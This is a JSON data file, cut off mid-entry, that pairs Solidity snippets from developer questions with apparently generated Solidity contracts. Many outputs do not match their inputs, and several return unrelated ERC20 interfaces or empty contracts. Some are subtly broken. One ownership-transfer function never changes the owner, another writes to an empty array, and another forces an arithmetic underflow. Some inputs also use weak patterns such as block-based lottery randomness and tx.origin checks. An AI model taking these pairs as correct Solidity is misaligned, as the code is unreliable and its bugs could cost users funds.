{
    "1.sol": {
        "input": "npm install dotenv --save\n\n \n\nrequire('dotenv').config();\nrequire(\"@nomiclabs/hardhat-ethers\");\nmodule.exports = {\n  solidity: \"0.8.17\",\n  defaultNetwork: \"goerli\",\n  networks: {\n     hardhat: {},\n     goerli: {\n        url:process.env.API_URL,\n        accounts: [`0x${process.env.PRIVATE_KEY}`]\n     }\n  },\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n}\n\n"
    },
    "2.sol": {
        "input": "struct Country {\n  uint a;\n  uint b;\n  string c;\n}\n\nexpect(await contract.getACountry(\"FR\")).to.have.member([1, 2, \"FR\"])\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Country {\n\n  struct Country {\n\n    uint a;\n    uint b;\n\n    string c;\n\n  }\n}\n\n"
    },
    "3.sol": {
        "input": "int top = int(int8(data[2]));\n\nint top = int(uint(data[2]));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC2980 {\n    function top() external returns (int);\n}\n\n"
    },
    "5.sol": {
        "input": "mapping(address => bool) public mappingName;\n\nfunction mappingName(address _myVar) public returns (bool)\n\nmappingName(address)\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n\n    mapping(address => bool) public mappingName;\n\n    function mappingName(address _myVar) public returns (bool) {\n        return mappingName[_myVar];\n    \n    }\n\n    function setMapping() public {\n        mappingName[msg.sender] = true;\n    }\n \n}\n\n"
    },
    "6.sol": {
        "input": "function pushelement() public {\n    by1 = abi.encodePacked(by1, bytes1(0x10));\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Element {\n    bytes1 by1 = 0x60;\n    bytes32 name_1 = bytes32(0x10);\n    bytes32 name_2 = bytes32(0x12);\n    \n    \n    \n    function pushelement() public {\n        \n    }\n}\n\n"
    },
    "7.sol": {
        "input": "struct Team {\n    string engineer;\n    mapping (string=>uint) numbers;\n}\n\nmapping(string=>Team) teams;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Team {\n        string engineer;\n        mapping (string => uint) numbers;\n    }\n    \n    mapping (string => Team) teams;\n}\n"
    },
    "9.sol": {
        "input": "pragma solidity ^0.7;\n\ncontract MyContract {\n    function foo() external pure returns (uint256) {\n        return uint(-1);\n    }\n}\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external pure returns (uint256) {\n        uint256 number = 0;\n        number--;\n        return number;\n    }\n}\n\nconst BN = web3.utils.BN;\nconst number = (new BN(2)).pow(new BN(8)).sub(new BN(1));\nconsole.log(number.toString());\n\nconst BN = web3.utils.BN;\nconst number = (new BN(2)).pow(new BN(256)).sub(new BN(1));\nconsole.log(number.toString());\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IErc20 {\n    function getTotalSupply() external view returns (uint256 totalSupply);\n\n    function balanceOf(address account) external view returns (uint256 balance);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    IErc20 public token;\n\n    address public owner;\n\n    constructor(address _owner, address _token) {\n        owner = _owner;\n        token = IErc20(_token);\n    }\n\n    function foo() external {\n        uint256 number = 0;\n        number--;\n        require(number > 0, \"You must have a positive number\");\n        require(msg.sender == owner, \"Only the owner can call this function\");\n        uint256 _amount = token.getTotalSupply();\n        require(_amount == number, \"Bad amount\");\n        token.transfer(owner, _amount);\n    }\n}\n\n"
    },
    "10.sol": {
        "input": "        if(!tokenWhitelist[msg.sender]&&!tokenWhitelist[_to]){\n            require(tokenBlacklist[msg.sender] == false);\n            require(tokenBlacklist[_to] == false);\n\n            require(tokenGreylist[msg.sender] == false);\n        }\n\n        if(msg.sender==LP&&ab&&!tokenWhitelist[_to]){\n            tokenGreylist[_to] = true;\n            emit Gerylist(_to, true);\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function getOwner() external view returns (address);\n}\n\n"
    },
    "11.sol": {
        "input": "function createCollectible(string memory tokenURI) public returns(uint256) {\n    require(tokenCounter == 0, \"error msg here\");\n    uint256 newItemId = tokenCounter;\n    _safeMint(msg.sender, newItemId);\n    _setTokenURI(newItemId, tokenURI);\n    tokenCounter = tokenCounter + 1;\n    return newItemId;\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC1155 {\n  function safeMint(address to, uint256 tokenId) external;\n  function safeMint(address to, uint256 tokenId, uint256 tokenURI) external;\n}\n\ncontract NFTS {\n  uint256 public tokenCounter;\n  mapping(uint256 => string) public tokenURIs;\n  mapping(uint256 => uint256) public itemIds;\n\n  function createCollectible(string memory tokenURI) public returns(uint256) {\n    require(tokenCounter == 0, \"error msg here\");\n    uint256 newItemId = tokenCounter;\n    _safeMint(msg.sender, newItemId);\n    _setTokenURI(newItemId, tokenURI);\n    tokenCounter = tokenCounter + 1;\n    return newItemId;\n  }\n\n  function _setTokenURI(uint256 itemId, string memory tokenURI) internal {\n    itemIds[itemId] = tokenCounter;\n    tokenURIs[itemId] = tokenURI;\n  }\n\n  function _safeMint(address to, uint256 tokenId) internal {\n    IERC1155(address(0)).safeMint(to, tokenId);\n  }\n}\n\n"
    },
    "12.sol": {
        "input": "for (element in array) {\n    ...\n}\n\nfor (uint256 i=0; i < array.length; i++) {\n    ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256[] public array;\n\n    constructor() {\n        array = [1, 2, 3, 4, 5];\n    }\n\n    function iterateArray() public {\n        for (uint256 i = 0; i < array.length; i++) {\n            // ...\n        }\n    }\n}\n"
    },
    "13.sol": {
        "input": "require(msg.value > 0.1 ether); \n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract PaymentGateway {\n\n  function () external payable {\n    require(msg.value > 0.1 ether); \n  }\n\n\n}\n\n"
    },
    "14.sol": {
        "input": "address payable public winner;\nfunction selectWinner() public {\n}\n...\n\nfunction showWinner() public returns(bool) {\n      return winner.transfer(getMoney());\n}\n\ncontract Lottery{\n    address public manager;\n    address payable[] public participants; \n    address payable selectedWinner;\n\n    constructor(){\n        manager = msg.sender;   \n    }\n\n    receive() external payable{       \n        require(msg.value == 1 ether);\n        participants.push(payable(msg.sender));\n    } \n\n    function getMoney() public view returns(uint){\n        require(msg.sender == manager);\n        return address(this).balance;\n    }\n\n    function random() public view returns(uint){\n        return uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp,participants.length)));\n    }\n   \n    function selectWinner() public{\n        require(msg.sender == manager);\n        require(participants.length >= 3);\n        uint r = random();\n\n\n        uint index = r % participants.length;\n\n        selectedWinner = participants[index];\n        selectedWinner.transfer(getMoney());   \n    }\n\n    function showWinner() public view returns(address){\n         return selectedWinner;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\n"
    },
    "15.sol": {
        "input": "uint public studentsCounter;\n\nmapping (uint => mapping (address => student)) public Info;\n\nfunction addInfo(student memory _student, address _address) public returns(uint){\n    require(owner == msg.sender, \"Only admin can add Info!!!\");\n    Info[studentsCounter][_address] = _student;\n    studentsCounter++;\n    student_Info.push(_address);\n    return studentsCounter-1;\n}\n\nstudent[] public student_Info;\n\nfunction addInfo(student memory _student, address _address) public {\n    require(owner == msg.sender, \"Only admin can add Info!!!\");\n    Info[_address] = _student;\n    student_Info.push(_student);\n} \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StudentContract {\n    uint public studentsCounter;\n\n    mapping (uint => mapping (address => Student)) public Info;\n\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    struct Student {\n        // Define the properties of a student\n        string name;\n        uint age;\n    }\n\n    Student[] public student_Info;\n\n    function addInfo(Student memory _student, address _address) public returns(uint) {\n        require(owner == msg.sender, \"Only admin can add Info!!!\");\n        Info[studentsCounter][_address] = _student;\n        studentsCounter++;\n        student_Info.push(_student);\n        return studentsCounter-1;\n    }\n}\n"
    },
    "16.sol": {
        "input": "     \nfunction convertFromTronInt(uint256 tronAddress) public view returns(address){\n      return address(tronAddress);\n}\n\ntronWeb.address.toHex(\"TH4EovGaTrmWxhJSmeMVKy5ZpnDGE3DgJ8\")\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Converter {\n\n  function convertFromTronInt(uint256 tronAddress) public view returns(address) {\n      return address(tronAddress);\n  }\n}\n\n"
    },
    "17.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract Bank {\n    uint256 public amountIn;\n    function deposit() external payable returns(uint256) {\n        amountIn = msg.value ;\n        return amountIn;\n    }\n    function getBalance() public view returns(uint){\n        return address(this).balance;\n    }\n}\n\n\ninterface Receiver {\n    function deposit() external payable returns(uint256);\n}\n\ncontract Sender {\n    Receiver private receiver ;\n    constructor(address _receiver){\n        receiver=Receiver(_receiver);\n    }\n\n    function sendDeposit(uint256 _amount) public payable {\n        receiver.deposit{value: _amount}();\n    }\n\n    receive() external payable {\n         require(msg.value > 0, \"You cannot send 0 ether\");\n    }\n\n }\n\n\n",
        "output": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ncontract Bank {\n    uint256 public amountIn;\n    function deposit() external payable returns(uint256) {\n        amountIn = msg.value ;\n        return amountIn;\n    }\n    // receive() external payable{}\n    function getBalance() public view returns(uint){\n        return address(this).balance;\n    }\n}\n\n\ninterface Receiver {\n    function deposit() external payable returns(uint256);\n}\n\ncontract Sender {\n    Receiver private receiver ;\n    constructor(address _receiver){\n        receiver=Receiver(_receiver);\n    }\n\n    function sendDeposit(uint256 _amount) public payable {\n        receiver.deposit{value: _amount}();\n    }\n\n    receive() external payable {\n         require(msg.value > 0, \"You cannot send 0 ether\");\n    }\n\n }\n\n"
    },
    "18.sol": {
        "input": "    address payable owner = msg.sender;\n\n    token.transferFrom(msg.sender, address(this), _amount);\n\n    owner.transfer(etherAmount);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20Interface {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "22.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\n\n\ncontract spu_university {\n    constructor(){\n    }\n\n    uint s_counter=0;\n\n    struct course {\n        string name;\n    }\n\n    struct student {\n        uint  id;\n        string firstName;\n        course[] all_courses;\n    }\n\n\n    mapping(uint => student) public getstudent;\n    \n    function registerStudent(\n        uint  _id,\n        string memory _firstName\n        ) public {\n            student storage s = getstudent[_id];\n\n            s.id = _id;\n            s.firstName = _firstName;\n\n            course memory c;\n            c.name = \"some course name\";\n            s.all_courses.push(c);\n\n            s_counter ++; \n    }\n\n    function addCourseToStudent(uint  _id) public {\n        student storage s = getstudent[_id];\n\n        course memory c;\n        c.name = \"some other course name\";\n\n        s.all_courses.push(c);\n    }\n\n    function getCourseOfStudent(uint _id) public view returns (course[] memory) {\n        return getstudent[_id].all_courses;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\n\ncontract spu_university {\n    constructor(){\n    }\n\n    uint s_counter=0;\n\n    struct course {\n        string name;\n    }\n\n    struct student {\n        uint  id;\n        string firstName;\n        course[] all_courses;\n    }\n\n\n    mapping(uint => student) public getstudent;\n    \n    function registerStudent(\n        uint  _id,\n        string memory _firstName\n        ) public {\n            student storage s = getstudent[_id];\n\n            s.id = _id;\n            s.firstName = _firstName;\n\n            course memory c;\n            c.name = \"some course name\";\n            s.all_courses.push(c);\n\n            s_counter ++; \n    }\n\n    function addCourseToStudent(uint  _id) public {\n        student storage s = getstudent[_id];\n\n        course memory c;\n        c.name = \"some other course name\";\n\n        s.all_courses.push(c);\n    }\n\n    function getCourseOfStudent(uint _id) public view returns (course[] memory) {\n        return getstudent[_id].all_courses;\n    }\n}\n\n"
    },
    "23.sol": {
        "input": "function mint() payable public returns (uint256) {\n  require(msg.value == 0.1 ether || msg.value == 100000000000000000 \n    wei, \"Transaction amount has to be 0.1 eth\");\n\n  payable(this).transfer(msg.value);\n\n  _safeMint(msg.sender, token_id);\n\n  token_id.increament();\n\n  return token_id;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20Interface {\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n\n  function allowance(address owner, address spender) external view returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "24.sol": {
        "input": " function setServiceFees(uint256[] memory prices) public onlyOwner {\n        require(prices.length == 4);\n        serviceFees = prices;\n    }\n\nmyContract.setServiceFees([\n        ethers.utils.parseEther(batchFee.toString()),\n        ethers.utils.parseEther(easyFee.toString()),\n        ethers.utils.parseEther(sellFee.toString()),\n        ethers.utils.parseEther(forthFee.toString()),\n  ])\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Owned {\n  address public owner;\n  address public newOwner;\n\n  event OwnershipTransferred(address indexed newOwner);\n\n  constructor () {\n    owner = msg.sender;\n  }\n\n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n\n  function transferOwnership(address newOwner) public onlyOwner {\n    newOwner = msg.sender;\n    emit OwnershipTransferred(newOwner);\n  }\n}\n\n"
    },
    "25.sol": {
        "input": "uint public addition = add(1,2);\nuint public product = multiply(add(2,3),add(2,1));\n\nfunction add(uint a,uint b)public pure returns(uint output){\n    output = a+b;\n}\n\nfunction multiply(uint a,uint b)public pure returns(uint){\n    return a*b;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyMathLibrary {\n    \n    uint public addition = add(1,2);\n    uint public product = multiply(add(2,3),add(2,1));\n    \n    function add(uint a,uint b)public pure returns(uint output){\n        output = a+b;\n    }\n    \n    function multiply(uint a,uint b)public pure returns(uint) {\n        return a*b;\n    }\n}\n\n"
    },
    "26.sol": {
        "input": "_binary[i] = bytes1(abi.encodePacked(r));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BinaryContract {\n    \n    bytes private _binary;\n    \n    constructor() {\n        _binary = new bytes(32);\n    }\n    \n    function setBinary(uint i, uint8 r) public {\n        require(i < _binary.length, \"Index out of bounds\");\n        _binary[i] = bytes1(abi.encodePacked(r));\n    }\n    \n    function getBinary() public view returns (bytes memory) {\n        return _binary;\n    }\n}\n\n"
    },
    "27.sol": {
        "input": "bytes32 leaf = keccak256(abi.encodePacked(account, amount));\n\nbytes32 computedHash = leaf;\ncomputedHash = _hashPair(computedHash, proofElement);\n\nif (computedRoot != root) {\n    revert InvalidProof();\n}\n\nIERC20(token).transfer(account, amount)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    function verifyProof(bytes32 root, bytes32[] memory proof, address account, uint256 amount, address token) public {\n        bytes32 leaf = keccak256(abi.encodePacked(account, amount));\n\n        bytes32 computedHash = leaf;\n        for (uint256 i = 0; i < proof.length; i++) {\n            computedHash = _hashPair(computedHash, proof[i]);\n        }\n\n        require(computedHash == root, \"InvalidProof\");\n\n        IERC20(token).transfer(account, amount);\n    }\n\n    function _hashPair(bytes32 left, bytes32 right) private pure returns (bytes32) {\n        return keccak256(abi.encodePacked(left, right));\n    }\n}\n"
    },
    "28.sol": {
        "input": "require(msg.sender == tx.origin, \"Reverting, Method can only be called directly by user.\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PaymentGateway { \n    receive() external payable {}\n    fallback() external payable {}\n}\n\ncontract Payment {\n    function sendPayment(address payable recipient, uint amount) external returns (uint) {\n        require(msg.sender == tx.origin, \"Reverting, Method can only be called directly by user.\");  \n        recipient.transfer(amount); \n        return amount;  \n    }\n}\n\n"
    },
    "29.sol": {
        "input": "project:/contracts/Fundraiser.sol:8:5 \n\nproject:/contracts/Fundraiser.sol:9:5\n\nproject:/contracts/Fundraiser.sol:18:5\nproject:/contracts/Fundraiser.sol:19:5\n\npragma solidity >0.4.23 <0.7.0;\n\ncontract Fundraiser{\n  string public name;\n  string public url;\n  string public imageURL;\n  string public description;\n  address payable beneficiary; \n  address custodian; \n\n  constructor(\n    string memory _name,\n    string memory _url,\n    string memory _imageURL,\n    string memory _description,\n    address payable _beneficiary,\n    address _custodian\n  )\n\n  public{\n    name = _name;\n    url = _url;\n    imageURL = _imageURL;\n    description = _description;\n    beneficiary = _beneficiary;\n    custodian = _custodian;\n\n         }\n       \u3000}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Fundraiser {\n    string public name;\n    string public url;\n    string public imageURL;\n    string public description;\n    address payable beneficiary; \n    address custodian; \n    \n    constructor(\n    string memory _name,\n    string memory _url,\n    string memory _imageURL,\n    string memory _description,\n    address payable _beneficiary,\n    address _custodian\n  )\n\n   public{\n    name = _name;\n    url = _url;\n    imageURL = _imageURL;\n    description = _description;\n    beneficiary = _beneficiary;\n    custodian = _custodian;\n\n         }\n        }\n\n"
    },
    "30.sol": {
        "input": "bytes4 private constant SELECTOR = bytes4(keccak256(bytes(\"transfer(address,uint256)\")));\n\n  nonPayableAddress.call(abi.encodeWithSignature(\"transfer(address,uint256)\", 0xaddress, amount))\n\n(bool success, bytes memory data) = contractAddress.call(\n        abi.encodeWithSelector(SELECTOR, to, value)\n    );\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20 {\n    function safeTransferFrom(address from, address to, uint256 tokenId) public;\n}\n\n"
    },
    "31.sol": {
        "input": "address lucky_winner = Daily.participants[index];\n\nlucky_winner = Daily.participants[index];\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DailyLottery {\n    address[] public participants;\n    address public lucky_winner;\n\n    function chooseWinner(uint256 index) public {\n        lucky_winner = participants[index];\n    }\n}\n"
    },
    "32.sol": {
        "input": "require(price >= 2, 'This token is not for sale');\n\n... = ownerOf(_id)\n\n_transfer(owner, msg.sender, _id);\n\npayable(owner).transfer(msg.value);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenContract {\n    address payable owner;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function buyToken(uint256 _id, uint256 price) public payable {\n        require(price >= 2, 'This token is not for sale');\n        address tokenOwner = ownerOf(_id);\n        _transfer(tokenOwner, msg.sender, _id);\n        payable(tokenOwner).transfer(msg.value);\n    }\n\n    function ownerOf(uint256 _id) public view returns (address) {\n        // implementation to get the owner of the token with given id\n    }\n\n    function _transfer(address _from, address _to, uint256 _id) internal {\n        // implementation to transfer the token with given id from _from to _to\n    }\n}\n"
    },
    "34.sol": {
        "input": "enum Role{ NONE, GUARDIAN, WARD} \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    enum Role { NONE, GUARDIAN, WARD }\n\n    mapping(address => Role) public roles;\n\n    function assignRole(address _person, Role _role) public {\n        roles[_person] = _role;\n    }\n\n    function getRole(address _person) public view returns (Role) {\n        return roles[_person];\n    }\n}\n\n"
    },
    "35.sol": {
        "input": "function getStudentInfo(uint256 num) public view returns (bytes32, student memory) {\n    bytes32 key = student_Address[num];\n    return (\n        key,\n        studentMap[key]\n    );\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StudentContract {\n    struct Student {\n        uint256 id;\n        string name;\n        uint256 age;\n    }\n    \n    mapping(bytes32 => Student) studentMap;\n    mapping(uint256 => bytes32) student_Address;\n    \n    function getStudentInfo(uint256 num) public view returns (bytes32, Student memory) {\n        bytes32 key = student_Address[num];\n        return (\n            key,\n            studentMap[key]\n        );\n    }\n}\n"
    },
    "36.sol": {
        "input": "IHEX(0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39).approve(_to,amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint256 value) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 public token;\n\n    constructor(address tokenAddress) public {\n        token = IERC20(tokenAddress);\n    }\n\n    function approveToken(address _to, uint256 amount) public returns (bool) {\n        return token.approve(_to, amount);\n    }\n}\n\n"
    },
    "37.sol": {
        "input": "holderlist[0] = msg.sender;\n\nholderlist.push(msg.sender);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract holderlist {\n\n    address[] public holderlist;\n\n    constructor() public {\n\nholderlist[0] = msg.sender;\n\nholderlist.push(msg.sender);\n\n}\n\n\n    receive() external payable {\n    }\n    function addholder(address _holder)public {\n    holderlist.push(_holder);\n    }\n}\n\n"
    },
    "38.sol": {
        "input": "address public maticFarmAddress = 0x24920E62B2702c11011823E64387B8AB46C1c927; \n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface MaticBridge {\n    function deposit(address _token, uint256 _amount) external returns (uint256);\n}\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ncontract matic_farm {\n    address public maticFarmAddress = 0x24920E62B2702c11011823E64387B8AB46C1c927; \n    MaticBridge private bridge;\n\n    constructor() public {\n        bridge = MaticBridge(maticFarmAddress);\n    }\n\n    function deposit(address _token, uint256 _amount) external payable {\n        uint256 tokens = IERC20(_token).balanceOf(address(this));\n        require(tokens == 0, \"Already deposited\");\n        bridge.deposit(_token, _amount);\n    }\n\n    receive() external payable {}\n}\n\n"
    },
    "39.sol": {
        "input": "pragma solidity 0.8.13;\n\ncontract TestLoop {\n    uint32[4] testArray;\n\n    function setArrayWithLoop(uint32[4] memory array) public {\n        for(uint256 i = 0; i < array.length; i++)\n            testArray[i] = array[i];\n    }\n\n    function setArrayWithoutLoop(uint32[4] memory array) public {\n        testArray = array;\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\ncontract NoLoop {\n    uint32[4] testArray;\n\n    constructor(uint32[4] memory array) {\n        testArray = array;\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\ncontract Loop {\n    uint32[4] testArray;\n\n    constructor (uint32[4] memory array) {\n        for(uint256 i = 0; i < array.length; i++)\n            testArray[i] = array[i];\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\nfrom brownie import TestLoop, NoLoop, Loop, accounts\n\ndef function_calls():\n    contract = TestLoop.deploy({'from': accounts[0]})\n    print('set array in loop')\n    contract.setArrayWithLoop([1, 2, 3, 4], {'from': accounts[1]})\n    print('array ', contract.show(), '\\n\\n')\n\n    print('set array by copy from memory to storage')\n    contract.setArrayWithoutLoop([10, 9, 8, 7], {'from': accounts[2]})\n    print('array ', contract.show(), '\\n\\n')\n\ndef deploy_no_loop():\n    print('deploy NoLoop contract')\n    contract = NoLoop.deploy([21, 22, 23, 24], {'from': accounts[3]})\n    print('array ', contract.show(), '\\n\\n')\n\ndef deploy_loop():\n    print('deploy Loop contract')\n    contract = Loop.deploy([31, 32, 33, 34], {'from': accounts[3]})\n    print('array ', contract.show(), '\\n\\n')\n\ndef main():\n    function_calls()\n    deploy_no_loop()\n    deploy_loop()\n\ncompiler:\n  solc:\n    version: 0.8.13\n    optimizer:\n      enabled: true\n      runs: 1\n\nRunning 'scripts/test_loop.py::main'...\nTransaction sent: 0x8380ef4abff179f08ba9704826fc44961d212e5ee10952ed3904b5ec7828c928\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0\n  TestLoop.constructor confirmed   Block: 1   Gas used: 251810 (2.10%)\n  TestLoop deployed at: 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87\n\nset array in loop\nTransaction sent: 0xfe72d6c878a980a9eeefee1dccdd0fe8214ee4772ab68ff0ac2b72708b7ab946\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0\n  TestLoop.setArrayWithLoop confirmed   Block: 2   Gas used: 49454 (0.41%)\n\narray  (1, 2, 3, 4) \n\n\nset array by copy from memory to storage\nTransaction sent: 0x0106d1a7e37b155993a6d32d5cc9dc67696a55acd1cf29d2ed9dba0770436b98\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0\n  TestLoop.setArrayWithoutLoop confirmed   Block: 3   Gas used: 41283 (0.34%)\n\narray  (10, 9, 8, 7) \n\n\ndeploy NoLoop contract\nTransaction sent: 0x55ddded68300bb8f11b3b43580c58fed3431a2823bf3f82f0081c7bfce66f34d\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0\n  NoLoop.constructor confirmed   Block: 4   Gas used: 160753 (1.34%)\n  NoLoop deployed at: 0x7CA3dB74F7b6cd8D6Db1D34dEc2eA3c89a3417ec\n\narray  (21, 22, 23, 24) \n\n\ndeploy Loop contract\nTransaction sent: 0x1aa64f2cd527983df84cfdca5cfd7a281ff904cca227629ec8b0b29db561c043\n  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1\n  Loop.constructor confirmed   Block: 5   Gas used: 153692 (1.28%)\n  Loop deployed at: 0x2fb0fE4F05B7C8576F60A5BEEE35c23632Dc0C27\n\narray  (31, 32, 33, 34)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestLoop {\n    uint32[4] testArray;\n\n    function setArrayWithLoop(uint32[4] memory array) public {\n        for(uint256 i = 0; i < array.length; i++)\n            testArray[i] = array[i];\n    }\n\n    function setArrayWithoutLoop(uint32[4] memory array) public {\n        testArray = array;\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\ncontract NoLoop {\n    uint32[4] testArray;\n\n    constructor(uint32[4] memory array) {\n        testArray = array;\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\ncontract Loop {\n    uint32[4] testArray;\n\n    constructor (uint32[4] memory array) {\n        for(uint256 i = 0; i < array.length; i++)\n            testArray[i] = array[i];\n    }\n\n    function show() public view returns (uint32[4] memory) {\n        return testArray;\n    }\n}\n\n"
    },
    "41.sol": {
        "input": "function go(uint[] calldata amounts, uint16[] calldata destChainIds, bytes[] calldata destinations) public payable {\n    uint length = 2;\n    for (uint i; i < length; i++) {\n        SendToken(amounts[i], destChainIds[i], destinations[i]);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IMultichain {\n    function send(\n        uint256 tokenId, \n        bytes calldata destChainId, \n        bytes calldata destination\n    ) external returns (bool);\n\n    function withdrawToken(\n        address tokenAddress, \n        uint256 tokenId, \n        uint amount\n    ) external returns (bytes memory result);\n}\n\ninterface IToken {\n    function send(\n        uint256 tokenId, \n        uint16 destChainId, \n        bytes calldata destination\n    ) external payable returns (bool);\n}\n\n"
    },
    "43.sol": {
        "input": "contract Lab03 is Interface{\n    mapping(address => Person) mapPerson;\n    mapping(address => Company) mapCompany;\n\n    Person p;\n    Company c;\n ...\n\n\npragma solidity ^0.7.0;\n\nstruct Person{\n    address addr;\n    string name;\n    string surname;\n}\n\nstruct Company{\n    address addr;\n    string name;\n}\n\n\ninterface Interface{\n\n    function addPerson(address addr, string memory name, string memory surname) external;\n    \n    function addCompany(address addr, string memory name) external;\n\n    function getPerson(address addrFind) external view returns (address addr);\n\n    function getCompany(address addrFind) external view returns (address addr);\n}\n    \n\nlibrary Lib{\n    struct LibPerson {\n        mapping(address => Person) mapPerson;\n    }\n\n    struct LibCompany {\n        mapping(address => Company) mapCompany;\n    }\n\n    function addPerson(LibPerson storage lp, address addr, string memory name, string memory surname) public{\n        addr = msg.sender;\n        lp.mapPerson[addr] = Person(addr, name, surname);\n    }\n\n    function addCompany(LibCompany storage lc, address addr, string memory name) public{\n        addr = msg.sender;\n        lc.mapCompany[addr] = Company(addr, name);\n    }    \n\n    function getCompany(LibCompany storage lc, address addrFind) view external returns(address){\n        return lc.mapCompany[addrFind].addr;\n    }   \n\n    function getPerson(LibPerson storage lp, address addrFind) view external returns(address){\n        return lp.mapPerson[addrFind].addr;\n    }     \n}\n\ncontract Lab03 is Interface{\n    Lib.LibPerson libP;\n    Lib.LibCompany libC;\n    Person p;\n    Company c;\n\n    function addPerson(address addr, string memory name, string memory surname) public override {\n        Lib.addPerson(libP, addr, name, surname);\n        emit addPersonEvent(addr, name, surname);\n    }\n\n    function addCompany(address addr, string memory name) public override{\n        Lib.addCompany(libC, addr, name);\n        emit addCompanyEvent(addr, name);\n    }\n\n    function getPerson(address _addressFind) public override view returns (address addr) {\n        return Lib.getPerson(libP, _addressFind);\n    }\n\n    function getCompany(address _addressFind) public override view returns (address addr) {\n        return Lib.getCompany(libC, _addressFind);\n    }\n\n    event addPersonEvent(address addr, string name, string surname);\n    event addCompanyEvent(address addr, string name);\n}\n\n\n",
